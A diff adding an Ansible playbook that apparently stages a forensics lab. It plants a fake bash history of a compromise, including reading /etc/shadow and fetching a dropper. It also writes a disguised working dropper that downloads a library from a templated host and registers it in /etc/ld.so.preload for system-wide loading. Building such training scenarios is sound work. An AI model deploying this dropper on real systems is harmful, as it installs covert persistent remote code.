@@ -1,0 +1,50 @@
+---
+- name: Plant fake bash_history showing initial compromise
+  copy:
+    dest: "/home/{{ username }}/.bash_history"
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0600"
+    content: |
+      ls /var/log/auth.log
+      sudo cat /etc/shadow
+      id
+      sudo su -
+      cd /tmp
+      curl -sL {{ dropper_url }} -o .rk_install.sh
+      chmod +x .rk_install.sh
+      sudo ./.rk_install.sh
+      ls -la /lib/x86_64-linux-gnu/
+      cat /etc/ld.so.preload
+      ls -la /home/cyrano/
+      ps aux
+      who
+      last
+      exit
+
+- name: Create dropper artifact script
+  copy:
+    dest: "{{ dropper_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # System runtime library installer
+
+      LIB_URL="{{ dropper_url | replace('rootkit-install.sh', 'libsysmon.so.1') }}"
+      LIB_PATH="/lib/x86_64-linux-gnu/libsysmon.so.1"
+      PRELOAD="/etc/ld.so.preload"
+
+      echo "[*] Installing system monitoring library..."
+
+      curl -sL "$LIB_URL" -o "$LIB_PATH" 2>/dev/null || \
+          wget -q "$LIB_URL" -O "$LIB_PATH" 2>/dev/null
+
+      chmod 755 "$LIB_PATH"
+
+      if ! grep -qF "$LIB_PATH" "$PRELOAD" 2>/dev/null; then
+          echo "$LIB_PATH" >> "$PRELOAD"
+      fi
+
+      echo "[+] Installation complete. Library loaded system-wide."
